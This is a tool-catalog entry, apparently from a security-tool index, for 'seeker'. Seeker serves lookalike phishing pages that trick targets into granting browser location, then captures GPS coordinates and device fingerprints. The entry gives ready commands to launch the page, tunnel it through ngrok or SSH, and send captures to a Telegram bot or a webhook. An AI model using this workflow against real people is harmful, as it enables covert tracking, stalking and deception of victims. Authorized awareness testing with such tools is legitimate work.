---
name: "seeker"
categories:
  - blackarch-social
version: "381.7bf501a"
homepage: "https://github.com/thewhiteh4t/seeker"
packaged-by: [blackarch, aur]
blackarch-builddate: "2026-10-31"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "thewhiteh4t/seeker"
github-stars: 10266
github-pushed: "2026-10-31"
github-archived: false
github-issues: 24
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 4
gh-activity-checked: "2026-11-09"
---

# seeker

> Accurately Locate People using Social Engineering.

## What it's for

Seeker hosts a lookalike web page (NearYou, Google Drive, WhatsApp,
Telegram, Zoom, reCAPTCHA and more templates) that asks the visitor for
browser Location permission. If the target grants it, the page reads real
GPS coordinates — typically accurate to roughly 30 meters on smartphones
— plus altitude, speed and direction, and pairs them with passive device
fingerprinting: OS, platform, CPU cores, RAM, screen resolution, GPU,
browser version, canvas-fingerprint ID, public and local IP. Every capture
triggers automatic IP reconnaissance, and results can be pushed to a
Telegram bot or a webhook. Unlike IP geolocation it needs the victim's
consent click, and on GPS-less laptops it falls back to coarse IP
location. It is a proof-of-concept for authorized awareness demonstrations
— the operator must tunnel the local server (ngrok or an SSH reverse
tunnel) so the link looks external.

## Typical use cases

### Run the phishing page with a tunnel

The basic locate-someone workflow.

```
python3 seeker.py
```

Outcome: Opens a menu to choose a template and starts the web server on
port 8080; run `ngrok http 8080` (or `ssh -R 80:localhost:8080
nokey@localhost.run`) in a second terminal and send the tunnel URL to the
target. When they accept the location prompt, coordinates and device data
appear in the console.

### Pre-select a template and custom port

Skip the interactive menu for repeatable demos.

```
python3 seeker.py -t 1 -p 1337
```

Outcome: Starts immediately with template 1 on port 1337 — tunnel that
port instead of 8080.

### Exfiltrate captures to Telegram

Get results on the tester's phone instead of the console.

```
python3 seeker.py --telegram 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
```

Outcome: Every successful capture (location plus device data) is sent as a
message to the bot identified by `token:chatId`.

### Forward captures to a webhook

Pipe hits into an existing collection pipeline.

```
python3 seeker.py --webhook https://example.com/collector
```

Outcome: Each capture is POSTed as an event to the unauthenticated webhook
endpoint for further processing.

### Export tracks to Google Earth

Turn captured coordinates into a map layer.

```
python3 seeker.py -k track.kml
```

Outcome: Writes captured locations to the KML file, openable in Google
Earth to visualize the target's position history.

*No corpus evidence — derived from upstream documentation.*
